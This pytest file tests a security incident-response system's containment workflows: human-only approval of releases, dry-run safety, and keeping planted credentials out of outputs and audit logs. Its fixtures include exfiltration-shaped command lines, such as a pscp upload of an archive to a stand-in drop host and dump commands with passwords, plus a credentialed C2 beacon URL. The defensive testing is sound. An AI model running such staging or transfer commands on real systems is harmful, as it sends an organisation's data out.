    assert set(release.control_keys) <= {c.control_key for c in mine}
    before = len(run.environment.state_changing_calls())
    run.decide_release({"decision": "APPROVE_ALL"}, approvers=["analyst", "lead"])
    restored = run.environment.state_changing_calls()[before:]
    restore_ops = {get_action_spec(c.action_type).rollback_action_type.value for c in mine}
    assert all(c.operation in restore_ops for c in restored), (
        f"{workflow}: release performed a non-restoration call: {[c.operation for c in restored]}")
    targets = {c.target.lower() for c in mine}
    assert all((c.target or "").lower() in targets for c in restored)


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_rejected_release_restores_nothing_and_keeps_controls_active(workflow: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    _approve_all(run)
    before = len(run.environment.state_changing_calls())
    run.propose_release()
    run.decide_release({"decision": "REJECT", "comment": "keep contained"}, approvers=["analyst", "lead"])
    assert len(run.environment.state_changing_calls()) == before
    controls = run.runtime.registry.list(incident_id=run.incident_id)
    assert controls and all(c.status.value == "ACTIVE" for c in controls)


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_release_of_a_selected_control_restores_only_that_control(workflow: str):
    run = _detect(_raw(workflow, "tp-approve-all"), workflow, "tp-approve-all", live=True)
    _approve_all(run)
    before = len(run.environment.state_changing_calls())
    release = run.propose_release()
    chosen = release.actions[0]
    run.decide_release({"decision": "APPROVE_SELECTED", "select": [f"{chosen.action_type.value}:{chosen.target}"]},
                       approvers=["analyst", "lead"])
    restored = [(c.operation, (c.target or "").lower()) for c in run.environment.state_changing_calls()[before:]]
    assert restored == [(chosen.action_type.value, chosen.target.lower())], restored
    still_active = [c for c in run.runtime.registry.list(incident_id=run.incident_id) if c.status.value == "ACTIVE"]
    assert len(still_active) == len(release.actions) - 1


def test_cloud_compromise_role_removal_release_needs_release_approval_and_restores_only_that_role():
    """edge-rogue-role-assignment: the rogue privileged role assignment is removed after approval;
    restoring it (re-granting a privileged role) needs its own human release approval, never an AI
    principal, and never touches another assignment."""
    run = _detect(_raw("cloud-compromise", "edge-rogue-role-assignment"), "cloud-compromise",
                  "edge-rogue-role-assignment", live=True)
    if not any(a.action_type is ActionType.REMOVE_PRIVILEGED_ROLE for a in run.detection.package.actions):
        pytest.skip("no role removal proposed")
    _approve_all(run)
    controls = run.runtime.registry.list(incident_id=run.incident_id)
    before = len(run.environment.state_changing_calls())
    release = run.propose_release()
    for alias in ("ai", "automation"):
        with pytest.raises(ApprovalError):
            run.orchestrator.submit_release_decision(
                run._request(release, {"decision": "APPROVE_ALL"}, "APPROVE_ALL"), run.credentials(alias))
    assert len(run.environment.state_changing_calls()) == before
    run.decide_release({"decision": "APPROVE_ALL"}, approvers=["analyst", "lead"])
    restored = {(c.target or "").lower() for c in run.environment.state_changing_calls()[before:]}
    assert restored <= {c.target.lower() for c in controls}


# ===================================================== 10. no secrets or needless personal data out --
def _plant_secrets(workflow: str) -> dict[str, Any]:
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    planted = False
    for record in _records(data):
        kind = record.get("kind")
        if kind == "detection":
            record["name"] = f"Credential tool unlock code: {SECRET_UNLOCK}"
            planted = True
        elif kind == "anomaly":
            record["detail"] = f"token={SECRET_TOKEN} seen in sign-in"
            planted = True
        elif kind == "sign_in":
            record["failure_reason"] = f"Authorization: Bearer {SECRET_TOKEN}"
            planted = True
        elif kind == "process_event":
            record["command_line"] = f"tool.exe --password {SECRET_PASSWORD} --token={SECRET_TOKEN}"
            planted = True
        elif kind == "mailbox_rule":
            record["name"] = f"Archive password={SECRET_PASSWORD}"
            planted = True
        elif kind == "cloud_app":
            record["display_name"] = f"Sync app client_secret={SECRET_TOKEN}"
            planted = True
    assert planted
    return data


@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
def test_planted_credentials_never_reach_packages_summaries_notifications_or_audit(workflow: str):
    data = _plant_secrets(workflow)
    run = _detect(data, workflow, "tp-approve-all", live=True)
    if run.detection.package is not None and run.detection.package.actions:
        _approve_all(run)
    text = _outputs_text(run)
    leaked = [s for s in (SECRET_PASSWORD, SECRET_UNLOCK, SECRET_TOKEN) if s in text]
    assert leaked == [], f"{workflow}: planted secret(s) {leaked} reached analyst-facing output or audit"


@pytest.mark.parametrize("form", ["userinfo", "query"])
def test_c2_url_credentials_never_reach_outputs_or_audit(form: str):
    """The beacon URL carries a credential (``user:password@`` or a ``token=`` query parameter), as
    implants often do. The URL becomes evidence, a rationale and a block target: the credential must
    not reach the package, the notes, notifications, the decision report or the audit trail."""
    old = "https://beacon-gate.test/api/checkin"
    new = (f"https://svc:{SECRET_PASSWORD}@beacon-gate.test/api/checkin" if form == "userinfo"
           else f"https://beacon-gate.test/api/checkin?token={SECRET_TOKEN}")
    data = _walk_replace(copy.deepcopy(_raw("c2", "tp-approve-all")), old, new)
    run = _detect(data, "c2", "tp-approve-all", live=True)
    assert run.detection.package is not None and run.detection.package.actions
    _approve_all(run)
    text = _outputs_text(run)
    leaked = [s for s in (SECRET_PASSWORD, SECRET_TOKEN) if s in text]
    assert leaked == [], f"URL credential ({form}) reached outputs or audit"


@pytest.mark.parametrize("workflow", ACCOUNT_WORKFLOWS)
def test_profile_details_the_analyst_does_not_need_stay_out_of_the_package_and_notifications(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    manager, title, display = "mgr.private.lab@example.com", "Lab Title Zeta Omega", "Pat Q. Labperson"
    planted = False
    for record in _records(data):
        if record.get("kind") == "user_profile":
            record.update({"manager": manager, "job_title": title, "display_name": display})
            planted = True
    if not planted:
        pytest.skip(f"{workflow}: no user profile record")
    run = _detect(data, workflow, "tp-approve-all", live=False)
    text = _outputs_text(run, audit=False)
    leaked = [v for v in (manager, title, display) if v in text]
    assert leaked == [], f"{workflow}: profile details {leaked} reached the package or notifications"


@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_isolation_unlock_codes_never_reach_outputs_or_audit(workflow: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    planted = False
    for record in _records(data):
        if record.get("kind") == "endpoint":
            record["isolation_state"] = "not_isolated"
        if record.get("kind") == "detection":
            record["name"] = f"Endpoint isolation unlock code for {_HOST} is {SECRET_UNLOCK}"
            planted = True
    if not planted:
        data["environment"]["records"].append({
            "integration": "secure_endpoint", "atomic": "investigate_endpoint", "subject": _HOST,
            "record": {"kind": "detection", "name": f"Endpoint isolation unlock code is {SECRET_UNLOCK}",
                       "verdict": "SUSPICIOUS", "severity": "LOW", "endpoint": _HOST, "status": "active"}})
    run = _detect(data, workflow, "tp-approve-all", live=True)
    _approve_all(run)
    assert SECRET_UNLOCK not in _outputs_text(run)


@pytest.mark.parametrize("label, text", [
    ("pass-switch", f"agent.exe /user:svc /pass:{SECRET_PASSWORD} LABMARK"),
    ("securestring", f"ConvertTo-SecureString '{SECRET_PASSWORD}' -AsPlainText -Force; LABMARK"),
])
@pytest.mark.parametrize("workflow, kind, field", [
    ("c2", "detection", "name"),
    ("dns-tunneling", "process_event", "file_path"),
    ("exfiltration", "anomaly", "detail"),
    ("suspicious-authentication", "mailbox_rule", "name"),
])
def test_credential_forms_in_free_text_never_reach_outputs(workflow: str, kind: str, field: str, label: str,
                                                          text: str):
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    planted = 0
    for record in _records(data):
        if record.get("kind") == kind:
            record[field] = text
            planted += 1
    if not planted:
        pytest.skip(f"{workflow}: no {kind} record")
    run = _detect(data, workflow, "tp-approve-all", live=True)
    if run.detection.package is not None and run.detection.package.actions:
        _approve_all(run)
    out = _outputs_text(run)
    if "LABMARK" not in out:
        pytest.skip(f"{workflow}: {kind}.{field} is not quoted in the outputs")
    assert SECRET_PASSWORD not in out, f"{workflow}: password in {kind}.{field} ({label}) reached outputs or audit"


def test_mailbox_forwarding_rule_conditions_with_credentials_never_reach_outputs():
    """A forwarding rule's conditions are attacker-chosen free text (keywords to intercept). A credential
    in them must not be copied to the package or the audit trail."""
    data = copy.deepcopy(_raw("suspicious-authentication", "tp-approve-all"))
    for record in _records(data):
        if record.get("kind") == "mailbox_rule":
            record["conditions"] = [f"subject contains password={SECRET_PASSWORD}"]
    run = _detect(data, "suspicious-authentication", "tp-approve-all", live=True)
    _approve_all(run)
    assert SECRET_PASSWORD not in _outputs_text(run)


# =====================================================================================================
# Deeper probes: insider decisions never spread, sanctioned binaries behind a C2 contact.
# =====================================================================================================
def test_exfiltration_insider_decision_never_spreads_to_another_user_of_the_source_endpoint():
    """legacy-05: an insider-risk detection names a.khan@example.com. Another (clean) account that also
    uses the source endpoint is never revoked or disabled: the decision does not spread."""
    data = copy.deepcopy(_raw("exfiltration", "legacy-05-insider-personal-cloud"))
    for record in _records(data):
        if record.get("kind") == "endpoint" and record.get("hostname") == "ENG-LT-21":
            record["users"] = list(record.get("users") or []) + ["c.lee@example.com"]
    run = _detect(data, "exfiltration", "legacy-05-insider-personal-cloud", live=False)
    bad = [s for s in _proposed(run) if s.endswith(":c.lee@example.com") or s.endswith(":b.ortiz@example.com")]
    assert bad == [], f"insider decision spread to other accounts: {bad}"


def test_c2_beaconing_process_running_an_approved_binary_is_never_terminated_or_hash_blocked():
    """The process behind the beacon runs the approved RMM agent's binary (allowlists.approved_rmm
    hash), which a vendor rates MALICIOUS. Terminating it would kill the sanctioned tool: the
    termination is withheld (shown as considered), never proposed or executed."""
    sha = "c2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0d"
    approved = "1111111111111111111111111111111111111111111111111111111111111111"
    data = _walk_replace(copy.deepcopy(_raw("c2", "tp-approve-all")), sha, approved)
    run = _detect(data, "c2", "tp-approve-all", live=True)
    bad = [s for s in _proposed(run) if s.startswith(("terminate_process:", "block_hash:"))]
    assert bad == [], f"approved binary terminated or blocked: {bad}"
    _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] in ("terminate_process", "block_hash")]


def test_c2_internal_url_host_is_never_a_standard_url_block():
    """exclusions.internal_domains lists corp.example.com. A beacon URL on an internal host
    (files.corp.example.com) is the organisation's own intranet: a URL block of it must be excluded
    (or ELEVATED with a warning), never a silent STANDARD block. url_block_allowed_domains
    (example.com) allows URL blocks on the owned public domain; it must not switch off the
    internal-domain exclusion for an internal sub-zone of that domain."""
    data = json.loads(json.dumps(_raw("c2", "tp-approve-all")).replace("beacon-gate.test", "files.corp.example.com"))
    run = _detect(data, "c2", "tp-approve-all", live=True)
    package = run.detection.package
    weak = [a.target for a in package.actions if a.action_type is ActionType.BLOCK_URL
            and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    assert weak == [], f"internal intranet URL proposed as a STANDARD block: {weak}"


# =====================================================================================================
# Phase 4, round 2 (workflow safety): deeper probes. Each test asserts the SAFE behaviour.
# =====================================================================================================
_PROD_LEAD = ["analyst", "lead"]


def _round2_all_fixtures() -> list[Any]:
    return [pytest.param(w, p.stem, id=f"{w}/{p.stem}") for w in P4_WORKFLOWS
            for p in sorted((FIXTURES / w).glob("*.yaml"))]


# ----------------------------------------------------------------- R2.1 dry run inert for every scenario --
@pytest.mark.parametrize("workflow, name", _round2_all_fixtures())
def test_r2_every_scenario_in_dry_run_is_side_effect_free_through_approval_and_release(workflow: str, name: str):
    """Every workflow supports dry run: whatever the scenario (benign, degraded, critical, partial
    failure, release), a dry-run run approved in full by two humans and then released reaches no vendor
    with anything but reads, registers no control and writes no execution result."""
    run = _detect(copy.deepcopy(_raw(workflow, name)), workflow, name, live=False)
    package = run.detection.package
    if package is not None and package.actions:
        assert package.dry_run
        run.decide({"decision": "APPROVE_ALL"}, approvers=_PROD_LEAD)
        try:
            run.propose_release()
            run.decide_release({"decision": "APPROVE_ALL"}, approvers=_PROD_LEAD)
        except Exception:  # noqa: BLE001 - refusing a dry-run release is fine
            pass
    writes = sorted({(c.kind.value, c.integration, c.operation) for c in run.environment.calls
                     if c.kind.value != "READ"})
    assert writes == [], f"{workflow}/{name}: dry run reached vendors with {writes}"
    assert run.runtime.registry.list() == []
    assert not ({AuditEventType.ACTION_RESULT, AuditEventType.CONTROL_REGISTERED,
                 AuditEventType.RESTORATION_RESULT} & set(_events(run)))


# --------------------------------------------------------------------- R2.2 c2 shared hosting via contacts --
def test_r2_c2_ip_that_a_connection_record_ties_to_a_clean_domain_is_never_blocked():
    """Shared hosting seen in the connection records themselves: a second connection from the endpoint
    reaches 198.51.100.45 for popular-site.test, a domain reputation rates CLEAN (no DNS answer record
    in the run ties the two). The beacon IP also serves a CLEAN service, so an IP block would cut that
    service for the whole estate. The c2 facts already compute ``clean_names`` for the IP from the
    connection records, and exfiltration treats exactly this case as ``serves_clean`` (14.12.6); the
    c2 IP block must not be proposed (it can be shown as considered)."""
    data = copy.deepcopy(_raw("c2", "tp-approve-all"))
    data["environment"]["reputations"].append({"type": "domain", "value": "popular-site.test", "verdict": "CLEAN",
                                               "risk_score": 0, "confidence": 85, "integrations": ["umbrella"],
                                               "summary": "popular site"})
    data["environment"]["records"].append({
        "integration": "secure_endpoint", "atomic": "investigate_endpoint", "subject": _HOST,
        "record": {"kind": "network_connection", "endpoint": _HOST, "user": "jsmith@example.com",
                   "remote_ip": "198.51.100.45", "remote_port": 443, "protocol": "tcp", "direction": "outbound",
                   "domain": "popular-site.test", "process_name": "browser.exe", "pid": 2210, "count": 4,
                   "action": "allowed", "first_seen": "2026-01-15T09:00:00Z", "last_seen": "2026-01-15T09:30:00Z"}})
    run = _detect(data, "c2", "tp-approve-all", live=True)
    assert "block_ip:198.51.100.45" not in _proposed(run), (
        "c2 proposes blocking an IP that a connection record ties to a CLEAN-rated domain (shared hosting)")
    _approve_all(run)
    assert not [c for c in _state_calls(run) if c[1] == "block_ip" and c[2] == "198.51.100.45"]


# ------------------------------------------------------- R2.3 c2 isolation resting only on a sanctioned tool --
def test_r2_c2_host_whose_only_malicious_activity_is_the_approved_rmm_binary_is_not_isolated():
    """The process behind the C2 contact runs the approved RMM agent (allowlists.approved_rmm hash),
    which a vendor rates MALICIOUS; no detection and no malicious process event exist. The runner
    withholds the termination as sanctioned (round 1). The isolation rests on nothing but the same
    sanctioned binary ("a process with a MALICIOUS hash holds the C2 connection"): it must follow the
    same evidence (withheld and shown as considered, like dns-tunneling's isolation in 14.12.6), or at
    least never be a STANDARD isolation of the host for running the sanctioned tool."""
    sha = "c2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0dc2be4c0d"
    approved = "1111111111111111111111111111111111111111111111111111111111111111"
    data = _walk_replace(copy.deepcopy(_raw("c2", "tp-approve-all")), sha, approved)
    data["environment"]["records"] = [e for e in data["environment"]["records"]
                                      if e["record"].get("kind") != "detection"]
    run = _detect(data, "c2", "tp-approve-all", live=False)
    proposed = _proposed(run)
    assert "terminate_process:TH-LT-1047/3120" not in proposed, "precondition: the termination is withheld"
    weak = [f"{a.action_type.value}:{a.target}" for a in run.detection.package.actions
            if a.action_type is ActionType.ISOLATE_ENDPOINT and _on_host(a, _HOST)
            and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    assert weak == [], (f"host isolated because the approved RMM binary holds the connection, while its "
                        f"termination is withheld as sanctioned: {weak}")


# ------------------------------------------------ R2.4 cloud-compromise: pre-existing legitimate role grant --
def test_r2_cloud_compromise_role_granted_long_before_the_compromise_is_never_removed():
    """edge-rogue-role-assignment: adm-okafor is compromised by a risky sign-in from a malicious IP on
    2026-01-15. Variant: the Global Administrator grant to backup-ops was made by adm-okafor in March
    2025, ten months before any compromise record (a routine assignment by the then-legitimate
    administrator). The workflow removes roles "granted by a compromised account during the
    investigated window"; a grant that predates every compromise record is a pre-existing assignment
    this incident did not create and no record ties to the attacker. Its removal must not be proposed
    (it can be shown as considered, like mail-ops's)."""
    data = copy.deepcopy(_raw("cloud-compromise", "edge-rogue-role-assignment"))
    for record in _records(data):
        if record.get("kind") == "role_change" and record.get("user") == "backup-ops@example.com":
            record["timestamp"] = "2025-03-03T09:00:00Z"
    run = _detect(data, "cloud-compromise", "edge-rogue-role-assignment", live=True)
    bad = [s for s in _proposed(run) if s.startswith("remove_privileged_role:backup-ops@example.com")]
    assert bad == [], f"role assignment made ten months before the compromise proposed for removal: {bad}"


# ------------------------------------------------------------- R2.5 non-public IPv6 never a STANDARD block --
_NON_PUBLIC_V6 = ["fd12:3456:789a::10", "fe80::1", "::1", "::ffff:10.20.30.40"]


@pytest.mark.parametrize("workflow", IP_WORKFLOWS)
@pytest.mark.parametrize("address", _NON_PUBLIC_V6)
def test_r2_non_public_ipv6_address_is_never_a_standard_ip_block(workflow: str, address: str):
    """A unique-local, link-local, loopback or IPv4-mapped private IPv6 address is the organisation's
    own network: put in place of the attacker IP (ratings kept), it never becomes a STANDARD
    block_ip and is never blocked."""
    baseline = _baseline(workflow)
    ips = [t for a, t, _k in baseline if a is ActionType.BLOCK_IP]
    others = {t.lower() for t in ips[1:]}
    data = _walk_replace(copy.deepcopy(_raw(workflow, "tp-approve-all")), ips[0], address)
    run = _detect(data, workflow, "tp-approve-all", live=True)
    package = run.detection.package
    weak = [a.target for a in (package.actions if package else ())
            if a.action_type is ActionType.BLOCK_IP and a.target.lower() not in others
            and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    assert weak == [], f"{workflow}: non-public address {address} proposed as a STANDARD block_ip: {weak}"


# --------------------------------------------- R2.6 exfiltration: account decisions never spread by host --
def test_r2_exfiltration_compromised_account_that_no_transfer_names_is_never_contained():
    """The transfer record names jsmith@example.com explicitly. A second account, c.lee@example.com,
    also uses the source laptop and has an unrelated identity risk (high). No transfer record names
    c.lee: the workflow's account rules are for "an account that drives the transfer", and the
    decision must not spread to another user of the same endpoint (the rationale would claim that
    c.lee drives a transfer no record attributes to it: an invented fact)."""
    data = copy.deepcopy(_raw("exfiltration", "tp-approve-all"))
    for record in _records(data):
        if record.get("kind") == "endpoint" and record.get("hostname") == _HOST:
            record["users"] = list(record.get("users") or []) + ["c.lee@example.com"]
    data["environment"]["records"].append({
        "integration": "entra", "atomic": "investigate_user", "subject": "c.lee@example.com",
        "record": {"kind": "user_profile", "user": "c.lee@example.com", "department": "Finance",
                   "groups": ["Finance"], "risk_level": "high", "risk_state": "at_risk", "account_enabled": True}})
    run = _detect(data, "exfiltration", "tp-approve-all", live=False)
    assert "disable_user:jsmith@example.com" in _proposed(run), "precondition: the transfer's account is contained"
    bad = [s for s in _proposed(run) if s.endswith(":c.lee@example.com")]
    assert bad == [], f"account actions on an account no transfer record names: {bad}"


# ---------------------------------------------- R2.7 release never touches any pre-existing control --
def _r2_reversible_cases() -> list[Any]:
    out = []
    for workflow in P4_WORKFLOWS:
        for action, target, _kind in _baseline(workflow):
            if action in _REVERSIBLE:
                out.append(pytest.param(workflow, action.value, target, id=f"{workflow}:{action.value}"))
    return out


@pytest.mark.parametrize("workflow, operation, target", _r2_reversible_cases())
def test_r2_release_never_undoes_a_control_that_existed_before_the_incident(workflow: str, operation: str,
                                                                           target: str):
    """Whatever reversible action is already in place before the incident (an IP already blocked, an
    account already disabled, a host already isolated), approving the package registers no control for
    it and an approved release never restores it."""
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["preexisting"] = list(data["environment"].get("preexisting") or []) + [
        {"action_type": operation, "target": target}]
    run = _detect(data, workflow, "tp-approve-all", live=True)
    _approve_all(run)
    controls = run.runtime.registry.list(incident_id=run.incident_id)
    assert not [c for c in controls if (c.action_type.value, c.target.lower()) == (operation, target.lower())]
    before = len(run.environment.state_changing_calls())
    if controls:
        run.propose_release()
        run.decide_release({"decision": "APPROVE_ALL"}, approvers=_PROD_LEAD)
    assert run.environment.in_desired_state(ActionType(operation), target), (
        f"{workflow}: release undid the pre-existing {operation} {target}")
    restored = [(c.operation, (c.target or "").lower()) for c in run.environment.state_changing_calls()[before:]]
    assert not [r for r in restored if r[1] == target.lower()], restored


# ------------------------------------------------------- R2.8 partial failure: transient vendor errors --
@pytest.mark.parametrize("workflow", P4_WORKFLOWS)
@pytest.mark.parametrize("fault", ["RATE_LIMIT", "UNAVAILABLE"])
def test_r2_rate_limited_or_unavailable_action_reports_partially_contained(workflow: str, fault: str):
    baseline = _baseline(workflow)
    action_type, target, _kind = baseline[-1]
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    data["environment"]["faults"] = [{"kind": fault, "operation": action_type.value, "target": target,
                                      "times": None}]
    run = _detect(data, workflow, "tp-approve-all", live=True)
    decision = _approve_all(run)
    assert decision.report is not None
    assert decision.report.overall is ContainmentOverall.PARTIALLY_CONTAINED, (
        f"{workflow}: {fault} on {action_type.value} {target} reported {decision.report.overall}")


# ----------------------------------------------- R2.9 credentials in staging / transfer command lines --
SECRET_ARCHIVE = "Zq7LabArchivePw9931"
_STAGING_FORMS = [
    ("7z-p", f"7z.exe a -p{SECRET_ARCHIVE} -mhe=on C:\\Users\\Public\\q4.7z C:\\Finance"),
    ("zip-P", f"zip -r -P {SECRET_ARCHIVE} q4.zip Finance"),
    ("rar-hp", f"rar.exe a -hp{SECRET_ARCHIVE} q4.rar C:\\Finance"),
    ("pscp-pw", f"pscp.exe -pw {SECRET_ARCHIVE} q4.zip drop@files-drop.test:/in"),
    ("mysql-p-attached", f"mysqldump -uroot -p{SECRET_ARCHIVE} finance"),
    ("storage-connection-string",
     f"azcopy.exe copy q4.zip --connection-string \"DefaultEndpointsProtocol=https;AccountName=labacct;"
     f"AccountKey={SECRET_ARCHIVE};EndpointSuffix=core.test\""),
    ("shared-access-key", f"sbsend.exe \"Endpoint=sb://lab.servicebus.test/;SharedAccessKeyName=root;"
                          f"SharedAccessKey={SECRET_ARCHIVE}\""),
    ("env-password", f"cmd /c set PGPASSWORD={SECRET_ARCHIVE}&& pg_dump finance"),
]


def _plant_command_line(workflow: str, text: str) -> dict[str, Any]:
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    planted = 0
    for record in _records(data):
        if record.get("kind") == "process_event":
            record["command_line"] = text
            planted += 1
    assert planted, f"{workflow}: precondition, a process event in the scenario"
    return data


@pytest.mark.parametrize("label, text", _STAGING_FORMS, ids=[f[0] for f in _STAGING_FORMS])
@pytest.mark.parametrize("workflow", ENDPOINT_WORKFLOWS)
def test_r2_archive_and_transfer_credentials_in_command_lines_never_reach_outputs(workflow: str, label: str,
                                                                                text: str):
    """Staging an archive with a password and pushing it with a stored credential is the normal shape
    of an exfiltration (and of a C2 or tunnel tool's own command line). The process event's command
    line is evidence (``ProcessEventRecord._EVIDENCE_FIELDS``) and is cited by the staging, termination
    and isolation proposals: the archive password, account key or tool password must not reach the
    package, notifications, the decision report or the audit trail."""
    data = _plant_command_line(workflow, text)
    run = _detect(data, workflow, "tp-approve-all", live=True)
    if run.detection.package is not None and run.detection.package.actions:
        _approve_all(run)
    out = _outputs_text(run)
    assert SECRET_ARCHIVE not in out, f"{workflow}: credential in a command line ({label}) reached outputs or audit"


# ------------------------------------------------------- R2.10 URL on a never_block domain (not owned) --
def test_r2_c2_url_on_a_never_block_domain_that_is_not_url_block_allowed_is_never_a_standard_block():
    """never_block.domains lists microsoft.com; url_block_allowed_domains lists only example.com. A
    beacon URL hosted on a microsoft.com sub-host (a cloud service the organisation depends on) must not
    become a STANDARD block_url or block_domain, whatever the reputation says: the owned-domain URL
    exception covers only url_block_allowed_domains."""
    data = json.loads(json.dumps(_raw("c2", "tp-approve-all")).replace("beacon-gate.test",
                                                                        "files.lab.microsoft.com"))
    run = _detect(data, "c2", "tp-approve-all", live=True)
    package = run.detection.package
    weak = [f"{a.action_type.value}:{a.target}" for a in package.actions
            if a.action_type in (ActionType.BLOCK_URL, ActionType.BLOCK_DOMAIN) and "microsoft.com" in a.target
            and (a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings)]
    assert weak == [], f"block of a never_block domain proposed: {weak}"
    _approve_all(run)
    assert not [c for c in _state_calls(run) if "microsoft.com" in (c[2] or "")]


# ------------------------------------------------------------- R2.11 critical accounts by group --
@pytest.mark.parametrize("workflow", ACCOUNT_WORKFLOWS)
@pytest.mark.parametrize("group", ["Executives", "Service Accounts", "Domain Admins", "Automation Accounts"])
def test_r2_account_in_a_critical_group_is_elevated_with_a_warning(workflow: str, group: str):
    """config/critical-assets.yaml classes accounts by group membership (Executives, Service Accounts,
    Domain Admins, Automation Accounts). The identity provider reports the group on the account's
    profile: every account action is ELEVATED with a visible warning, never STANDARD and never
    skipped."""
    baseline = _baseline(workflow)
    user = sorted({t for _a, t, k in baseline if k is TargetKind.USER})[0]
    data = copy.deepcopy(_raw(workflow, "tp-approve-all"))
    marked = False
    for record in _records(data):
        if record.get("kind") == "user_profile" and record.get("user") == user:
            record["groups"] = list(record.get("groups") or []) + [group]
            marked = True
    assert marked, f"{workflow}: precondition, a profile record for {user}"
    run = _detect(data, workflow, "tp-approve-all", live=False)
    actions = [a for a in run.detection.package.actions if a.target_kind is TargetKind.USER and a.target == user]
    missing = [f"{a.value}:{t}" for a, t, k in baseline if t == user
               and not any((x.action_type, x.target) == (a, t) for x in actions)]
    assert missing == [], f"{workflow}: account actions on the {group} member dropped: {missing}"
    weak = [f"{a.action_type.value}:{a.target}" for a in actions
            if a.approval_level is not ApprovalLevel.ELEVATED or not a.warnings]
    assert weak == [], f"{workflow}: member of {group} contained at STANDARD approval: {weak}"
